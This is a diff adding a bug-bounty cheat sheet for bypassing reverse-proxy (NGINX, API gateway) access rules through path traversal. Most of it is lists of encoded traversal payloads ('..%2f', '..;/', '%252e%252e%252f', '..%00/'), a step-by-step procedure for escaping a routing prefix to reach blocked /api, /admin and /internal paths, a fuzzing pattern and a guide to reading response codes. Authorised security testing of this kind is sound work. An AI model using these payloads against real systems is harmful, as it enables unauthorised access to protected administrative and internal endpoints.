@@ -1,0 +1,165 @@
+===============================================
+NGINX / REVERSE PROXY PATH TRAVERSAL – BLACK BOX
+===============================================
+
+GOAL:
+Detect reverse-proxy parser mismatches (NGINX, API gateways, load balancers)
+by observing 403 → 404 / 400 behavior changes, then escaping routing context.
+
+-----------------------------------------------
+STEP 1 – FIND ROUTING PREFIX (ENTRY CONTEXT)
+-----------------------------------------------
+Look in:
+- Chrome DevTools (XHR / Fetch)
+- JS files
+- API calls
+Common prefixes:
+  /experience
+  /app
+  /portal
+  /gateway
+  /v1
+  /beta
+  /internal
+
+-----------------------------------------------
+STEP 2 – CONFIRM PROXY ENFORCEMENT
+-----------------------------------------------
+Test sensitive paths:
+  /api
+  /admin
+  /dashboard
+  /internal
+  /metrics
+
+Expected:
+  403 Forbidden  → proxy rule exists
+
+-----------------------------------------------
+STEP 3 – CONTEXT ESCAPE PAYLOADS (CORE SET)
+-----------------------------------------------
+Use ONLY on routing prefix (NOT /api directly)
+
+../
+..\ 
+..%2f
+..%5c
+%2e%2e/
+%2e%2e%2f
+%2e%2e%5c
+
+-----------------------------------------------
+STEP 4 – SECONDARY CONTEXT / SEMICOLON BYPASS
+-----------------------------------------------
+..;/
+..;\\
+..%3b/
+..%3b%2f
+..%3b%5c
+
+-----------------------------------------------
+STEP 5 – NGINX-SPECIFIC ENCODED SLASH CONFUSION
+-----------------------------------------------
+..%2f
+..%252f
+..%255c
+%2e%2e%252f
+%252e%252e%252f
+
+-----------------------------------------------
+STEP 6 – DOT NORMALIZATION CONFUSION
+-----------------------------------------------
+./../
+././../
+....//
+..././
+.%2e/
+.%2e%2f
+..%2e/
+
+-----------------------------------------------
+STEP 7 – MIXED PATH SEPARATORS
+-----------------------------------------------
+..\./
+./..\ 
+..\../
+..%2f%5c
+..%5c%2f
+
+-----------------------------------------------
+STEP 8 – PATH TERMINATION / EMPTY SEGMENTS
+-----------------------------------------------
+/..//
+/..///
+/../
+/%2f..%2f
+/%2f%2e%2e%2f
+
+-----------------------------------------------
+STEP 9 – RARE BUT HIGH SIGNAL (400 TRIGGERS)
+-----------------------------------------------
+..%00/
+..%0d/
+..%0a/
+
+-----------------------------------------------
+STEP 10 – CONFIRM CONTEXT ESCAPE
+-----------------------------------------------
+Example:
+  /experience/..%2f        → 404 / 400 (GOOD)
+  /experience/..%2f/api    → 200 / 404 (BYPASS)
+
+If direct:
+  /api → 403
+But via traversal works → VALID BUG
+
+-----------------------------------------------
+STEP 11 – CONTENT DISCOVERY (IMPORTANT ORDER)
+-----------------------------------------------
+DO NOT fuzz /api directly.
+
+Correct fuzzing pattern:
+  /experience/..%2fFUZZ
+
+Example wordlist:
+  api
+  dashboard
+  admin
+  internal
+  metrics
+  status
+  nginx
+  v1
+  v2
+  health
+  actuator
+  management
+
+-----------------------------------------------
+STEP 12 – RECURSIVE TRAVERSAL (ESCALATION)
+-----------------------------------------------
+/experience/..%2f..%2f
+/experience/..%2f..%2f/api
+/experience/..%2f..%2f/admin
+
+-----------------------------------------------
+RESPONSE CODE INTERPRETATION
+-----------------------------------------------
+403 → proxy blocked
+404 → backend reached (VERY GOOD)
+400 → parser mismatch (TRY MORE)
+200 → IMPACT
+
+-----------------------------------------------
+FINAL RULES (BUG BOUNTY MINDSET)
+-----------------------------------------------
+- Traversal without context is useless
+- Always traverse FROM allowed routing prefix
+- 404 is often better than 200 initially
+- One working payload must be reused everywhere
+- Fuzz ONLY after traversal works
+- Proxy bugs escalate fast (P3 → P1)
+
+===============================================
+END
+===============================================
